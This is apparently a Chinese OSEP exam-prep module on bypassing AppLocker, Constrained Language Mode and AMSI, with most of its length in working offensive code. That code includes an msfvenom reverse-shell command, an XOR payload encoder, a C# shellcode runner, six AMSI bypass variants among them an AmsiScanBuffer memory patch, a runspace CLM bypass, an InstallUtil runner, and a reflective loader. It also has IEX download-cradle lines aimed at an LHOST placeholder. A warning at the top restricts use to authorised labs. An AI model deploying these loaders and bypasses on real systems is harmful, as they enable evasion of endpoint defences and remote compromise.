::: warning 仅限授权使用
本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
:::

# 模块 M05：AppLocker / CLM / AMSI 绕过与受信任宿主

> 覆盖场景：18、19、20、21、22、23、24
> > 教材依据：第 11 章（AV 规避）、第 13 章（AppLocker / CLM 绕过）、第 8–9 章（托管程序集加载）
> 前置依赖：一个可执行代码的入口（宏 / HTA / JScript / Web）；目标有 Defender + 可能启用 AppLocker、CLM；攻击机可编译 C#/C

**本模块的共同原则**：先**分清被拦的是"加载器"还是"执行内容"**。这两类失败的修法完全不同——加载器被查杀要改静态特征与宿主形态，执行内容被拦要改行为与分阶段。考试里最常见的错误是：被拦后只反复改静态编码，而问题其实出在行为。

---

## 场景 18：自定义 EXE 一落地就被删除

**场景回顾**：目标允许上传文件，但你准备的 Runner 在启动前就被隔离；简单无害程序可以保存和执行。→ 说明**落地文件的静态特征**被命中，而不是执行行为。

**前提与假设**：
- 已有文件投递通道（HTTP/SMB/Web 上传）。
- 能观察到"文件消失"或"进程未创建"。
- 攻击机可编译自定义 Runner（mingw-w64 / csc）。

**准备（攻击机侧）**：

1. 建立对照基线——先投一个无害程序，确认投递与执行本身没问题：
   ```bash
   x86_64-w64-mingw32-gcc -o hello-x64.exe hello.c -s -O2   # 只 printf("ok")
   ```
2. 准备编码/加密版 shellcode（XOR 最简单、最稳）：
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f raw -o sc.bin
   python3 m13-xor-encoder.py sc.bin --format c   # 输出 C 数组 + key
   ```
3. 准备自定义 C# Runner（不用 msfvenom 模板，减少公共特征）：
   ```bash
   # 目标机上编译（如果 csc 可用）
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:r.exe m01-shellcode-runner-x64.cs
   ```

**执行步骤**：

1. 投递无害程序，确认能落地、能运行 → 证明投递通道正常。
2. 投递自定义 Runner（先不带 payload，只打印），观察是否被删：
   - 被删 → 加载器静态特征问题，进入第 3 步。
   - 未被删但连不上 → 进入场景 19（行为检测）。
3. 定位特征：把 Runner 拆成若干段，逐段替换为无害代码，二分法找出被命中的字符串/API 组合。常见命中点：`VirtualAlloc` + `CreateThread` 组合、明文字符串 `meterpreter`、常见 msfvenom 模板字节序列。
4. 换成编码/加密版本：shellcode 以密文数组形式内嵌，运行时在内存中 XOR 解密；字符串拆分成多段拼接。
5. 换宿主形态：不落地独立 EXE，改用 InstallUtil 程序集 / 托管程序集加载 / PowerShell 反射（见场景 20、23）。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m13-xor-encoder.py` | 生成 XOR 编码后的 C 数组 | `sc.bin --format c` |
| `m01-shellcode-runner-x64.cs` | 自定义 C# Runner（含 XOR 解密） | 替换密文数组与 key |
| `m05-amsi-bypass-variants.ps1` | PowerShell 路线时的 AMSI 处理 | 见脚本内说明 |

#### `m13-xor-encoder.py` {#m13-xor-encoder-py}

````python
#!/usr/bin/env python3
"""用途：对 Linux payload（ELF / 原始 shellcode 文件）做单字节 XOR 编码，
输出 .enc 文件或 C 数组；配套 m13-simple-loader.c 在内存中解码执行，
保证磁盘上不出现明文 payload。

场景：M13 场景 36（上传站执行 ELF，磁盘/内容要过业务检查）
      与场景 37（Linux AV 文件签名检测，常见 ELF 被检出）。

依赖：Python 3.7+（标准库 argparse）。

使用：
    # 编码为文件（loader 外部文件模式直接读它）
    python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa -o stage2.enc

    # 输出 C 数组（loader 内嵌模式：把输出贴进 m13-simple-loader.c 的 enc_payload[]）
    python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa --c-array

    # 还原（自测：编码后必须能还原出与 -i 完全一致的内容）
    python3 m13-xor-encoder.py -i stage2.enc -k 0xfa -d -o plain.bin && cmp plain.bin shellcode.bin

    # 多字节 key 示例：-k 0xfa,0x1b,0x2c（解码端需一致，loader 默认单字节）
    python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa,0x1b -o stage2.enc

占位符：LHOST/LPORT 只出现在被编码的 payload 内部（生成 payload 时决定，
       本脚本不感知）。key 默认 0xfa，用 -k 修改并保持 loader 端一致。

测试状态：语法已过 ast.parse；编码/解码对称逻辑可离线自测（见上面 -d 用法）；
未在目标机实测。
"""
from __future__ import annotations

import argparse
import sys

def parse_key(text: str) -> list[int]:
    """解析 -k：支持 0xfa / 250 / 逗号分隔多字节 0xfa,0x1b。值域 0-255。"""
    keys: list[int] = []
    for part in text.split(","):
        part = part.strip()
        try:
            value = int(part, 0) if part.lower().startswith("0x") else int(part)
        except ValueError:
            raise SystemExit(f"[-] 非法 key: {part!r}（示例: -k 0xfa 或 -k 250,0x1b）")
        if not 0 <= value <= 255:
            raise SystemExit(f"[-] key 越界(0-255): {part}")
        keys.append(value)
    return keys

def xor_bytes(data: bytes, keys: list[int]) -> bytes:
    """单字节/多字节 XOR：key 循环使用。"""
    if len(keys) == 1:
        k = keys[0]
        return bytes(b ^ k for b in data)
    return bytes(b ^ keys[i % len(keys)] for i, b in enumerate(data))

def emit_c_array(data: bytes, name: str = "enc_payload") -> str:
    """输出可直接粘贴进 m13-simple-loader.c 的 C 字节数组。"""
    lines = [f"static unsigned char {name}[] = {{"]
    for i in range(0, len(data), 12):
        chunk = ", ".join(f"0x{b:02X}" for b in data[i : i + 12])
        lines.append("    " + chunk + ",")
    lines.append("};")
    return "\n".join(lines)

def main() -> int:
    ap = argparse.ArgumentParser(description="XOR payload 编码器（M13 场景 36/37）")
    ap.add_argument("-i", "--input", required=True, help="输入 payload 文件路径")
    ap.add_argument("-o", "--output", default="", help="输出文件路径（--c-array 时忽略）")
    ap.add_argument("-k", "--key", default="0xfa", help="XOR key，支持 0xfa / 250 / 0xfa,0x1b")
    ap.add_argument("--c-array", action="store_true", help="输出 C 数组到 stdout（粘贴进 loader）")
    ap.add_argument("-d", "--decode", action="store_true", help="解码模式（自测还原用）")
    args = ap.parse_args()

    keys = parse_key(args.key)
    try:
        with open(args.input, "rb") as fh:
            data = fh.read()
    except OSError as exc:
        print(f"[-] 读取失败 {args.input}: {exc}", file=sys.stderr)
        return 1
    if not data:
        print(f"[-] 输入为空: {args.input}", file=sys.stderr)
        return 1

    verb = "解码" if args.decode else "编码"
    out = xor_bytes(data, keys)
    print(f"[*] {verb}: {args.input} ({len(data)} B) key={args.key}")

    if args.c_array:
        sys.stdout.write(emit_c_array(out) + "\n")
        return 0

    dest = args.output or (args.input + (".dec" if args.decode else ".enc"))
    try:
        with open(dest, "wb") as fh:
            fh.write(out)
    except OSError as exc:
        print(f"[-] 写入失败 {dest}: {exc}", file=sys.stderr)
        return 1
    print(f"[+] 已写出: {dest} ({len(out)} B)")
    return 0

if __name__ == "__main__":
    sys.exit(main())
````

#### `m01-shellcode-runner-x64.cs` {#m01-shellcode-runner-x64-cs}

````csharp
// 用途：自定义 x64 shellcode Runner（预编译使用，避免 Add-Type 动态编译落地临时文件）
// 场景：4、18、19（Add-Type 被拦 / 自定义 EXE 被静态查杀 / 行为检测对照）
// 依赖：.NET Framework 4.x（目标机 csc.exe 编译，或攻击机 mono/dotnet 交叉编译）
// 使用：
//   目标机：C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:r.exe m01-shellcode-runner-x64.cs
//   攻击机：mcs -out:r.exe m01-shellcode-runner-x64.cs
// 占位符：SHELLCODE_B64（XOR 编码后的 x64 shellcode 的 Base64）、XOR_KEY
// 测试状态：未编译验证（本机无 csc/mono）；语法已人工检查
//
// 说明：
//   - shellcode 以 Base64 字符串内嵌（避免明文字节数组的静态特征），运行时 XOR 解密。
//   - 用 P/Invoke 而不是 Add-Type 生成临时程序集，所以不会在 %TEMP% 留下编译产物。
//   - 若目标对 VirtualAlloc+CreateThread 有行为拦截，改用 Assembly.Load 走托管路径（见 m01-reflective-runner.ps1）。

using System;
using System.Runtime.InteropServices;
using System.Text;

class Runner
{
    private const string SHELLCODE_B64 = "REPLACE_WITH_BASE64_XOR_SHELLCODE";
    private const byte XOR_KEY = 0x2A;

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    private static byte[] Decode()
    {
        byte[] data = Convert.FromBase64String(SHELLCODE_B64);
        for (int i = 0; i < data.Length; i++) data[i] ^= XOR_KEY;
        return data;
    }

    public static void Run()
    {
        byte[] sc = Decode();

        const uint MEM_COMMIT_RESERVE = 0x3000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);
        if (mem == IntPtr.Zero)
        {
            Console.Error.WriteLine("VirtualAlloc 失败（可能被 ASR/EDR 拦截），错误码 " + Marshal.GetLastWin32Error());
            return;
        }

        Marshal.Copy(sc, 0, mem, sc.Length);

        uint tid;
        IntPtr h = CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out tid);
        if (h == IntPtr.Zero)
        {
            Console.Error.WriteLine("CreateThread 失败，错误码 " + Marshal.GetLastWin32Error());
            return;
        }

        WaitForSingleObject(h, 2000);
    }

    public static void Main(string[] args)
    {
        Run();
    }
}
````

#### `m05-amsi-bypass-variants.ps1` {#m05-amsi-bypass-variants-ps1}

````powershell
<#
用途：AMSI 处理的多个实验版本，按宿主（PowerShell / WSH / .NET）选择匹配的实现
场景：3、7、10、18、19（以及 M05 全部场景中 PowerShell 路线的前置）
依赖：PowerShell 3.0+；部分版本需要反射权限（CLM 下会失败，见 m05-clm-bypass-runspace.ps1）
使用：powershell -ep bypass -f m05-amsi-bypass-variants.ps1 -Variant 1
      或在已有会话中：. .\m05-amsi-bypass-variants.ps1; Invoke-AmsiVariant -Variant 2
占位符：无（纯本地操作，不涉及 LHOST/LPORT）
测试状态：未在 Windows 实测；已人工检查语法。考试前必须在实验环境逐个验证有效性
说明：
  - AMSI 的处理方式随补丁变化，一个版本失效不代表技术不可用，换下一个版本即可。
  - 先做"探针"判断 AMSI 是否生效，再决定是否需要处理。
  - PowerShell 宿主用 PS 版本；WSH（.js/.vbs）必须用 WSH 专用版本，不能照搬。
#>
[CmdletBinding()]
param(
    [ValidateSet(1, 2, 3, 4, 5, 6)][int]$Variant = 1,
    [switch]$ProbeOnly
)

function Test-AmsiActive {
    <#
    无害探针：包含 AMSI 常扫特征字符串。若被拦，说明 AMSI 生效。
    #>
    $probe = 'Invoke-Mimikatz'
    $marker = 'AmsiUtils' + 'amsiInitFailed'
    Write-Output ("[*] 探针字符串: {0} / {1}" -f $probe, $marker)
    try {
        $sb = [scriptblock]::Create($probe)
        Write-Output "[+] 探针未被拦截（AMSI 可能未生效或已被处理）"
        return $false
    } catch {
        Write-Output ("[!] 探针被拦截：{0}" -f $_.Exception.Message)
        return $true
    }
}

function Invoke-AmsiVariant {
    param([int]$Variant)

    Write-Output ("[*] 应用 AMSI 处理版本 {0}" -f $Variant)

    switch ($Variant) {
        1 {
            # 版本 1：反射设置 amsiInitFailed（最经典，常被拦，但先试）
            try {
                $a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like '*iUtils' }
                $f = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like '*Failed' }
                $f.SetValue($null, $true)
                Write-Output "[+] 版本 1 完成"
            } catch { Write-Output ("[-] 版本 1 失败: {0}" -f $_.Exception.Message) }
        }
        2 {
            # 版本 2：通过字符串拼接避开静态特征
            try {
                $s = 'S'+'y'+'s'+'t'+'e'+'m'+'.'+'M'+'a'+'n'+'a'+'g'+'e'+'m'+'e'+'n'+'t'+'.'+'A'+'u'+'t'+'o'+'m'+'a'+'t'+'i'+'o'+'n'
                $t = [type]($s + '.AmsiUtils')
                $f = $t.GetField('amsiInitFailed', 'NonPublic,Static')
                $f.SetValue($null, $true)
                Write-Output "[+] 版本 2 完成"
            } catch { Write-Output ("[-] 版本 2 失败: {0}" -f $_.Exception.Message) }
        }
        3 {
            # 版本 3：破坏 amsiContext（反射置空上下文）
            try {
                $t = [Ref].Assembly.GetType(('System.Management.Automation.'+'AmsiUtils'))
                $ctx = $t.GetField('amsiContext', 'NonPublic,Static')
                $ctx.SetValue($null, [IntPtr]::Zero)
                Write-Output "[+] 版本 3 完成"
            } catch { Write-Output ("[-] 版本 3 失败: {0}" -f $_.Exception.Message) }
        }
        4 {
            # 版本 4：内存补丁（把 AmsiScanBuffer 首字节改为 ret）
            try {
                $k = @"
using System;
using System.Runtime.InteropServices;
public class P {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        uint old;
        VirtualProtect(addr, (UIntPtr)5, 0x40, out old);
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,0x80070057; ret
        Marshal.Copy(patch, 0, addr, patch.Length);
    }
}
"@
                Add-Type -TypeDefinition $k -ErrorAction Stop
                [P]::Patch()
                Write-Output "[+] 版本 4 完成（需允许 Add-Type）"
            } catch { Write-Output ("[-] 版本 4 失败（Add-Type 可能被拦）: {0}" -f $_.Exception.Message) }
        }
        5 {
            # 版本 5：自定义 Runspace 内置版本（CLM 环境下配合使用）
            try {
                $rs = [runspacefactory]::CreateRunspace()
                $rs.Open()
                $ps = [powershell]::Create()
                $ps.Runspace = $rs
                [void]$ps.AddScript({ $ExecutionContext.SessionState.LanguageMode = 'FullLanguage' })
                [void]$ps.Invoke()
                Write-Output "[+] 版本 5 完成（新 Runspace 语言模式已放开）"
            } catch { Write-Output ("[-] 版本 5 失败: {0}" -f $_.Exception.Message) }
        }
        6 {
            # 版本 6：不做处理，只报告（用于对照实验）
            Write-Output "[*] 版本 6：未做任何处理，作为对照组"
        }
    }
}

if ($ProbeOnly) {
    [void](Test-AmsiActive)
} else {
    [void](Test-AmsiActive)
    Invoke-AmsiVariant -Variant $Variant
    Write-Output ""
    Write-Output "[*] 复测："
    [void](Test-AmsiActive)
    Write-Output "[*] 提示：版本 1/2/3 属于反射类，补丁后常失效；版本 4 需要 Add-Type；"
    Write-Output "    版本 5 与 CLM 绕过配合；全部失效时考虑改用托管程序集或非 PowerShell 路线。"
}
````

**验证**：投递后 `dir` 确认文件存在；运行后 `tasklist` 确认进程；监听端确认回连。三者缺一都要重新定位。

**失败分支与备选**：
1. 换编码仍被删 → 加载器本身被特征化 → 改用受信任宿主（InstallUtil / Workflow / XSL，场景 23、24）或托管程序集加载（场景 20）。
2. 文件能落地但 Defender 报毒 → 关闭实时保护（若已有管理员权限，见 `Defense Evasion` → Disable Defender），或改用内存执行不落地。
3. 目标禁止执行任何未签名 EXE → 直接放弃 EXE 路线，转 AppLocker 允许路径（场景 21）或 DLL（场景 22）。

**考试注意 / OPSEC**：先做无害对照，否则你无法判断"是投递失败还是被查杀"；每次只改一个变量并记录；不要在同一台机器上反复投递同一特征文件（可能触发更激进的拦截）。

---

## 场景 19：EXE 能保存、能启动，但开始执行内容时被终止

**场景回顾**：文件落地没问题，运行初期也正常；进入后续执行或通信阶段后进程被终止。→ 这是**行为检测**，不是静态查杀。

**前提与假设**：
- 场景 18 的对照实验已证明文件能落地、能启动。
- 目标存在行为监控（Defender 的 Behavior Monitor / EDR 规则）。
- 可生成多种执行实现做对照。

**准备（攻击机侧）**：准备三组对照样本

| 样本 | 实现 | 观察点 |
|---|---|---|
| A | 进程内直接解密并执行 shellcode | 是否在 `VirtualAlloc`+`CreateThread` 后被终止 |
| B | 跨进程注入（CreateRemoteThread / APC） | 是否在打开远程进程后被终止 |
| C | 进程空心化（Process Hollowing） | 是否在挂起/替换镜像阶段被终止 |

```bash
# 参照 cheat sheet：C# Process Injection / DLL Shellcode Inject
# 生成后先用无害 payload（弹出计算器或写文件）验证行为，再换真实 payload
```

**执行步骤**：
1. 投递 A（进程内），观察终止点：是分配内存时、创建线程时，还是网络连接时。
2. 若在**通信阶段**被终止 → 问题在 C2 通道而非注入（转 [09-c2-egress-channels](/zh/modules/09-c2-egress-channels)）。
3. 若在**注入 API** 处被终止 → 换 B / C 实现，或改为加载托管程序集（`Assembly.Load`，避免显式 `VirtualAlloc`）。
4. 若在**解密后执行**处被终止 → 换 payload 形态（staged、更小的 shellcode、HTTP 而非 TCP 回连）。
5. 记录每组的终止点，形成"行为—拦截"对照表（这份表在考试报告里很值钱）。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m01-shellcode-runner-x64.cs` | 进程内执行（样本 A） | 换 payload 与 key |
| `m05-clm-bypass-runspace.ps1` | 托管内存执行备选 | 见脚本 |
| `m05-amsi-bypass-variants.ps1` | 脚本路线的 AMSI 处理 | 见脚本 |

#### `m05-clm-bypass-runspace.ps1` {#m05-clm-bypass-runspace-ps1}

````powershell
<#
用途：通过自定义 Runspace 绕过 Constrained Language Mode（CLM），并在新 Runspace 中执行任意脚本
场景：7、10、19（HTA/JScript/宏入口进入后，PowerShell 处于 CLM 时使用）
依赖：PowerShell 3.0+；.NET 4.x（CreateRunspace 需要完整 CLR 权限）
使用：powershell -ep bypass -f m05-clm-bypass-runspace.ps1 -Command "whoami; $PSVersionTable"
      或先 . .\m05-clm-bypass-runspace.ps1 再用 Invoke-FullLanguage { ... }
占位符：无（脚本本身不联网；如需加载远程脚本，用 -Command 传入含 LHOST 的命令）
测试状态：未在 Windows 实测；已人工检查语法
说明：
  - CLM 只限制"当前 Runspace"的语言能力；新建 Runspace 默认是 FullLanguage。
  - 若目标同时启用 AppLocker，仍需保证 PowerShell 本身被允许执行。
  - 执行失败时先确认 $ExecutionContext.SessionState.LanguageMode 的实际值。
#>
[CmdletBinding()]
param(
    [string]$Command = "whoami; hostname; `$ExecutionContext.SessionState.LanguageMode"
)

function Get-CurrentLanguageMode {
    try { return $ExecutionContext.SessionState.LanguageMode } catch { return "Unknown" }
}

function Invoke-FullLanguage {
    <#
    .SYNOPSIS
    在新建的 Runspace（FullLanguage）中执行脚本块或字符串。
    #>
    param(
        [Parameter(Mandatory = $true)][object]$Script,
        [hashtable]$Arguments = @{}
    )

    $rs = [runspacefactory]::CreateRunspace()
    $rs.ApartmentState = 'STA'
    $rs.ThreadOptions = 'ReuseThread'
    $rs.Open()

    $ps = [powershell]::Create()
    $ps.Runspace = $rs

    try {
        if ($Script -is [scriptblock]) {
            [void]$ps.AddScript($Script.ToString())
        } else {
            [void]$ps.AddScript([string]$Script)
        }
        foreach ($k in $Arguments.Keys) { [void]$ps.AddParameter($k, $Arguments[$k]) }
        $out = $ps.Invoke()
        if ($ps.Streams.Error.Count -gt 0) {
            Write-Output ("[-] 执行报错: " + ($ps.Streams.Error | Out-String))
        }
        return $out
    } catch {
        Write-Output ("[-] Runspace 执行失败: {0}" -f $_.Exception.Message)
        return $null
    } finally {
        $ps.Dispose()
        $rs.Close()
        $rs.Dispose()
    }
}

Write-Output ("[*] 当前语言模式: {0}" -f (Get-CurrentLanguageMode))

# 方式 1：新 Runspace 执行（推荐，不修改当前会话）
Write-Output "[*] 在新 Runspace 中执行命令..."
$result = Invoke-FullLanguage -Script $Command
if ($result) { $result | ForEach-Object { Write-Output ("    " + $_) } }

# 方式 2：如果当前会话本身受限且需要长期使用，可直接修改当前 Runspace 的语言模式（部分环境下被拦）
if ((Get-CurrentLanguageMode) -ne 'FullLanguage') {
    try {
        $ExecutionContext.SessionState.LanguageMode = 'FullLanguage'
        Write-Output ("[+] 当前会话语言模式已改为: {0}" -f (Get-CurrentLanguageMode))
    } catch {
        Write-Output ("[-] 当前会话无法直接修改语言模式（预期内）: {0}" -f $_.Exception.Message)
    }
}

Write-Output ""
Write-Output "[*] 常见后续动作："
Write-Output "    1) 在 FullLanguage 下执行 AMSI 处理：. .\m05-amsi-bypass-variants.ps1 -Variant 2"
Write-Output "    2) 反射加载程序集：. .\m01-reflective-runner.ps1 -Path payload.dll"
Write-Output "    3) 下载执行第二阶段：IEX (New-Object Net.WebClient).DownloadString('http://LHOST/stage2.ps1')"
````

**验证**：进程是否存活到发起网络连接；监听端是否收到连接；`Get-MpThreatDetection` 是否有告警记录。

**失败分支与备选**：
1. 三种注入实现都被拦 → 改用受信任宿主加载（场景 23、24），或走托管程序集（场景 20）。
2. 只在发起外连时被拦 → 走代理/DNS/域前置（`docs/09`）。
3. 只在特定 payload 被拦 → 换 payload 而非换注入方式。

**考试注意 / OPSEC**：行为检测靠"差异"触发，别在同一进程里连续尝试多种注入；每次尝试间隔开，并在失败后确认进程是否已被标记。

---

## 场景 20：需要使用托管工具，但其 EXE 文件不能落地运行

**场景回顾**：已经有一个可执行托管逻辑的宿主；某个 .NET 工具直接落地运行被限制，但它的程序集格式适合在现有宿主中加载。→ **原生 EXE ≠ 托管程序集**，要换加载方式。

**前提与假设**：
- 已有能执行 .NET 代码的宿主（PowerShell、自定义 C# 宿主、Office 宏内的 .NET 调用）。
- 目标工具是托管程序集（.NET DLL）或可被 `Assembly.Load` 加载的字节流。
- 不能直接运行其 EXE（AppLocker / AV / 权限限制）。

**准备（攻击机侧）**：
```bash
# 拿到工具的托管程序集（DLL），必要时从 EXE 中提取为程序集
# 本机可用 mcs / dotnet 编译测试用程序集
```

**执行步骤**：
1. 确认目标是托管程序集：
   ```powershell
   [Reflection.AssemblyName]::GetAssemblyName("C:\path\tool.dll").FullName
   ```
2. 加载并反射调用入口（不落地执行 EXE）：
   ```powershell
   $bytes = [IO.File]::ReadAllBytes("C:\path\tool.dll")
   $asm = [Reflection.Assembly]::Load($bytes)
   $asm.GetTypes() | Where-Object { $_.IsPublic } | Select-Object FullName
   # 找到入口类型后调用其静态方法，参数按工具要求适配
   $t = $asm.GetType("Tool.Program"); $t.GetMethod("Main").Invoke($null, @([string[]]@("arg1","arg2")))
   ```
3. 依赖处理：把依赖程序集放到同一目录，或用 `AppDomain.AssemblyResolve` 事件从内存解析。
4. 输出适配：工具原本写控制台/文件，反射调用时捕获返回值或重定向输出。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m05-installutil-runner.cs` | 托管程序集加载器模板 | 替换程序集路径/入口 |
| `m01-reflective-runner.ps1` | PowerShell 反射加载 | 替换 DLL 路径与参数 |

#### `m05-installutil-runner.cs` {#m05-installutil-runner-cs}

````csharp
// 用途：InstallUtil 兼容托管 Runner——一个可被 InstallUtil.exe 调用的 .NET 安装器类，
//       同时在 Install/Uninstall 双入口触发执行；额外提供静态 Run() 供 Assembly.Load+反射路线调用（场景 20）
// 场景：20（EXE 不能落地 → 反射加载托管程序集）；23（InstallUtil 作为受信任宿主的模板；InstallUtil 被拦时
//       本文件的"反射入口"仍可被场景 20 使用）
// 依赖：目标机 .NET Framework（v2.0/v4.0 均可，v4.0 目录下 csc.exe 编译）；运行宿主 InstallUtil.exe 在
//       C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ 或 Framework\（x86）
// 使用：编译（在目标机或攻击机均可，攻击机编译注意目标 .NET 版本一致）：
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:runner.exe m05-installutil-runner.cs
//   运行（/U 走 Uninstall 入口，日志更少）：
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U runner.exe
// 占位符：修改下面的 PayloadCmd 为你的命令；如需下载执行把 URL=换成你的 HTTP 地址
// 测试状态：未在 Windows 实测；C# 语法已人工检查。考试前在实验环境验证 InstallUtil 入口与反射入口
// 说明：InstallUtil 是受信任宿主（AppLocker 默认放行），它运行的是托管安装器；不要放原生 EXE 进来。
//       被 AMSI 拦时先按宿主处理 AMSI（见 m05-amsi-bypass-variants.ps1）。
using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;

[RunInstaller(true)]
public class Runner : Installer
{
    // ===== 载荷配置 =====
    // 用 base64 编码命令可避免命令行明文特征。生成示例（Kali 侧）：
    //   echo -n "whoami" | base64            -> d2hvYW1p
    // 留空字符串 = 不做任何事（仅验证宿主触发，先跑通再填真载荷）
    private const string B64_CMD = "";

    // 下载执行的第二阶段 URL（B64_CMD 为空时若此值非空则下载并执行 PAYLOAD）
    private const string STAGE_URL = ""; // 例: http://LHOST/PAYLOAD

    public Runner() { }

    /// <summary>InstallUtil /install 入口</summary>
    public override void Install(System.Collections.IDictionary stateSaver)
    {
        ExecutePayload();
    }

    /// <summary>InstallUtil /u 入口（推荐，卸载动作较少被监控）</summary>
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        ExecutePayload();
    }

    /// <summary>反射入口：供 Assembly.Load(byte[]) + GetMethod("Run").Invoke 使用（场景 20）</summary>
    public static void Run()
    {
        ExecutePayload();
    }

    private static void ExecutePayload()
    {
        try
        {
            string cmd = DecodeCmd();
            if (!string.IsNullOrEmpty(cmd))
            {
                // 用 cmd.exe 承载命令，隐藏自身进程的命令行；注意会被行为监控观察（场景 19 判断）
                Process.Start(new ProcessStartInfo("cmd.exe", "/c " + cmd)
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
                Console.WriteLine("[+] Runner: 命令已触发");
            }
            else if (!string.IsNullOrEmpty(STAGE_URL))
            {
                // 下载第二阶段（经 PowerShell；被 AMSI 拦则先处理 AMSI 或换 certutil/bitsadmin）
                string ps = string.Format(
                    "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('{0}')\"",
                    STAGE_URL);
                Process.Start(new ProcessStartInfo("cmd.exe", "/c " + ps)
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
                Console.WriteLine("[+] Runner: 第二阶段下载已触发");
            }
            else
            {
                Console.WriteLine("[+] Runner: 空载荷——仅验证宿主触发成功（可把 B64_CMD / STAGE_URL 填上）");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[-] Runner 执行失败: " + ex.Message);
        }
    }

    private static string DecodeCmd()
    {
        if (string.IsNullOrEmpty(B64_CMD)) return "";
        try
        {
            byte[] raw = Convert.FromBase64String(B64_CMD);
            return System.Text.Encoding.UTF8.GetString(raw);
        }
        catch
        {
            return B64_CMD; // 非 base64 时按明文命令处理
        }
    }
}
````

#### `m01-reflective-runner.ps1` {#m01-reflective-runner-ps1}

````powershell
<#
用途：反射加载 .NET 程序集（内存执行，不落地临时文件），替代被拦的 Add-Type 动态编译
场景：4、3（Add-Type 产生的临时文件被删 / 需要内存加载已编译程序集）
依赖：PowerShell 3.0+；目标已有或已投递的程序集（.dll 或 Base64 字节）
使用：
    powershell -ep bypass -f m01-reflective-runner.ps1 -Path payload.dll
    powershell -ep bypass -f m01-reflective-runner.ps1 -Base64 <base64> -Type Payload.Runner -Method Run
占位符：LHOST/URL（若用 -Url 下载）；程序集路径/Base64 与入口类型由使用者替换
测试状态：未在 Windows 实测；已人工检查语法
#>
[CmdletBinding(DefaultParameterSetName = 'Path')]
param(
    [Parameter(ParameterSetName = 'Path', Mandatory = $true)][string]$Path,
    [Parameter(ParameterSetName = 'Base64', Mandatory = $true)][string]$Base64,
    [Parameter(ParameterSetName = 'Url', Mandatory = $true)][string]$Url,
    [string]$Type = '',
    [string]$Method = '',
    [string[]]$Arguments = @(),
    [switch]$ListTypes
)

function Get-AssemblyBytes {
    switch ($PSCmdlet.ParameterSetName) {
        'Path'   { return [IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $Path)) }
        'Base64' { return [Convert]::FromBase64String($Base64) }
        'Url'    {
            Write-Output ("[*] 从 {0} 下载程序集字节..." -f $Url)
            return (New-Object Net.WebClient).DownloadData($Url)
        }
    }
}

try {
    $bytes = Get-AssemblyBytes
    Write-Output ("[*] 程序集字节数: {0}" -f $bytes.Length)

    # 内存加载（不写磁盘）
    $asm = [Reflection.Assembly]::Load($bytes)
    Write-Output ("[+] 已加载: {0}" -f $asm.FullName)

    if ($ListTypes -or -not $Type) {
        Write-Output "[*] 公开类型："
        $asm.GetTypes() | Where-Object { $_.IsPublic } | ForEach-Object { Write-Output ("    " + $_.FullName) }
        if (-not $Type) { return }
    }

    $t = $asm.GetType($Type)
    if (-not $t) { throw ("未找到类型: {0}" -f $Type) }

    if (-not $Method) {
        # 自动挑入口：Run → Main → 第一个无参公开静态方法
        $candidates = $t.GetMethods([Reflection.BindingFlags]'Public,Static') |
            Where-Object { $_.GetParameters().Count -eq $Arguments.Count }
        $m = $candidates | Where-Object Name -eq 'Run' | Select-Object -First 1
        if (-not $m) { $m = $candidates | Where-Object Name -eq 'Main' | Select-Object -First 1 }
        if (-not $m) { $m = $candidates | Select-Object -First 1 }
    } else {
        $m = $t.GetMethod($Method)
    }
    if (-not $m) { throw "未找到可调用的入口方法" }

    Write-Output ("[+] 调用 {0}.{1}()" -f $t.FullName, $m.Name)
    $result = $m.Invoke($null, [object[]]$Arguments)
    if ($null -ne $result) { Write-Output ("[+] 返回: {0}" -f $result) }
} catch {
    Write-Output ("[-] 失败: {0}" -f $_.Exception.Message)
